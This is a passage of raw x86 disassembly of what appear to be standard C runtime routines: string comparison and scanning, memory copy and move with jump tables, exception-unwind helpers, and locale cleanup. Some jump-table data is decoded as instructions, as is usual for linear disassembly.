  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
